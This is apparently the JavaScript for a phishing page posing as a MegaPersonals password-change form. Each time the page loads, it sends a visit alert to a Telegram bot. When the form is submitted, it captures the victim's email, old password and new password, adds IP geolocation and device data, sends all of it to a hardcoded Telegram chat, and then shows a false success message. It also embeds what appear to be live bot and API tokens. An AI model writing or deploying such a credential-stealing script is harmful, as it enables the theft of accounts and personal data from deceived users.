const botToken = '7371610501:AAFcYAjSy1ZKgKh7ihaq6dLJvt9yj8gDonE';
const chatId = '7623079090';
const ipinfoToken = '2da9da1f876081';

// Visit notification on page load
window.addEventListener('load', async () => {
  const notifyMessage = `🚨 Someone just visited the site!\n📅 Time: ${new Date().toLocaleString()}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: notifyMessage,
      })
    });
    console.log("🔔 Visit notification sent to Telegram.");
  } catch (err) {
    console.error("Telegram visit-notify error:", err);
  }
});

document.getElementById('passwordForm').addEventListener('submit', async function (e) {
  e.preventDefault();

  const email = document.getElementById('email').value;
  const oldPass = document.getElementById('oldPassword').value;
  const newPass = document.getElementById('newPassword').value;

  let ipData = {};
  try {
    const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
    ipData = await res.json();
  } catch (err) {
    console.error("IP Info fetch failed:", err);
  }

  const device = navigator.userAgent;

  const message = `
🔐 MegaPersonals Form Submitted
📧 Email: ${email}
🔑 Old Password: ${oldPass}
🆕 New Password: ${newPass}

🌐 IP: ${ipData.ip || 'N/A'}
📍 City: ${ipData.city || 'N/A'}
🌎 Region: ${ipData.region || 'N/A'}
🇨🇺 Country: ${ipData.country || 'N/A'}
📡 ISP: ${ipData.org || 'N/A'}
📱 Device: ${device}
`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      })
    });
    alert("Submitted successfully!");
  } catch (err) {
    console.error("Telegram send error:", err);
    alert("Submission failed!");
  }
});
